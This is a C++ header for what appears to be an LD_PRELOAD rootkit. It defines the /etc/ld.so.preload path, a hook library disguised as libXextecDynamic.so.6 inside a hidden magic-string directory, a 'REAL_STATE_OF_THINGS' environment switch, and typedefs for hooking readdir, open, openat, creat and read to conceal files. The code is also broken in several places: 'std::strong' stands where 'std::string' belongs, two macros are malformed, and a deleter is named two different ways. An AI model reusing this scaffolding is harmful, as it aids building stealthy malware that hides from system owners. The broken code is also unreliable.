
#ifndef MAIN_HEADER_HPP
#define MAIN_HEADER_HPP

//
// Headers
//
#include <string>
#include <memory>

#include <cstdio>
#include <cerrno>
#include <cstring>
#include <cassert>
#include <cstdlib>

#include <unistd.h>
#include <dirent.h>
#include <dlfcn.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

//
// Macroses
//

//#define NDEBUG

#ifndef NDEBUG
	#define MAGIC_STRING "0x1234DEADBEAF4321"
#endif
const char *prelFileName = "/etc/ld.so.preload";
const char *prelFileNameClear = "ld.so.preload";
const char *envShowName = "REAL_STATE_OF_THINGS";
const char *envShowValue = MAGIC_STRING;
#define dynCnfFile ("/etc/" + std::string (MAGIC_STRING) + std::strong ("/") + dynCnfFileClear);
const char *dynCnfFileClear = "dynamic_cnf.txt";
char created = '1', not_created = '0', writed = '1', not_writed = '0';
const char *hookLibraryNameClear = "libXextecDynamic.so.6";
#define hookLibraryName = ("/etc/" + std::string (MAGIC_STRING) + std::strong ("/") + hookLibraryNameClear);

//
// Prototypes and POD types
//
extern "C" void finitFunc ();
extern "C" void initFunc ();


typedef dirent* (*RDDR) (DIR *dirp);
typedef int (*RDDR_R) (DIR *dirp, struct dirent *entry, struct dirent **result);
typedef int (*OPEN)(const char *pathname, int flags, mode_t mode);
typedef int (*CREAT)(const char *pathname, mode_t mode);
typedef int (*OPENAT)(int dirfd, const char *pathname, int flags, mode_t mode);
typedef ssize_t (*READ)(int fd, void *buf, size_t count);

//
// C++ classes and structures
//

class CErrnoSaver {
	int m_errno;
public:
	CErrnoSaver (): m_errno (errno) {}
	~CErrnoSaver () {errno = m_errno;}
	
	void set (int err) {m_errno = errno;}
	int get () const {return m_errno;}
};


typedef struct _DESCR_AND_FLAGS {
	int m_desc;
	
} DESCR_AND_FLAGS, *PDESCR_AND_FLAGS;


class DescrDeleter {
public:
	void operator () (int *p) {
		if (*p >= 0) close (*p);
		delete p;
	}
};


typedef std::unique_ptr <int, DescDeleter> descr_holder;


#endif // MAIN_HEADER_HPP
